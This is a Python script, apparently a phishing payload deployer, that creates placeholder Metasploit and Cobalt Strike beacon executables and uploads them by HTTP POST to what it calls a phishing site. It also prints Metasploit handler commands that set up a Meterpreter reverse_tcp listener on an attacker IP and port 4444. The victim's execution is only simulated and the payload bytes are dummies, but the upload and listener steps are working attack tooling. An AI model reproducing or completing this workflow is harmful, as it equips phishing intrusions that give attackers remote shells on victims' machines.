# payload_deployer.py
import os
import requests
import time

# === Configuration ===
ATTACKER_IP = "192.168.1.10"  # Replace with your actual IP
METASPLOIT_PORT = 4444
url = "http://localhost/upload"  # Replace with real or local server

# === Payload Generators ===
def generate_metasploit_payload():
    """Simulate Metasploit payload creation."""
    payload_name = "metasploit_payload.exe"
    print("[*] Metasploit payload generation...")
    with open(payload_name, "wb") as f:
        f.write(b"FakePayloadData")  # placeholder
    return payload_name

def generate_cobalt_strike_payload():
    """Simulate Cobalt Strike beacon payload (if file exists)."""
    payload_name = "beacon.exe"
    if not os.path.exists(payload_name):
        print(f"[!] Cobalt Strike payload '{payload_name}' not found. Creating dummy payload.")
        with open(payload_name, "wb") as f:
            f.write(b"FakeBeaconPayload")
    return payload_name

# === Upload + Execution ===
def upload_payload(url, payload_file):
    """Upload payload to phishing site (real or simulated)."""
    try:
        print(f"[*] Uploading {payload_file} to {url}...")
        with open(payload_file, "rb") as f:
            files = {"file": (payload_file, f)}
            response = requests.post(url, files=files, timeout=10)
        if response.status_code == 200:
            print(f"[+] Upload successful: {url}")
            return True
        else:
            print(f"[-] Upload failed (status {response.status_code})")
            return False
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return False

def setup_metasploit_listener_simulated():
    """Print listener setup instructions instead of executing."""
    print("\n[!] You need to run the following manually in Metasploit:")
    print(f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {ATTACKER_IP}
set LPORT {METASPLOIT_PORT}
exploit
    """)

def execute_payload_on_target(payload_name):
    """Simulate phishing trigger."""
    print(f"[*] Execution of {payload_name} on victim system...")
    time.sleep(2)
    print("[+] Payload executed.")

# === Main Workflow ===
def rse():
    print("=== Payload Deployer (Single Module) ===\n")

    cobalt_payload = generate_cobalt_strike_payload()
    metasploit_payload = generate_metasploit_payload()

    # Try Cobalt Strike payload upload first
    if cobalt_payload and upload_payload(url, cobalt_payload):
        execute_payload_on_target(cobalt_payload)
    elif metasploit_payload and upload_payload(url, metasploit_payload):
        setup_metasploit_listener_simulated()
        execute_payload_on_target(metasploit_payload)
    else:
        print("[-] Both uploads failed. Aborting.")

    print("\n[✔] Done. Monitor your listener or fake log for results.")
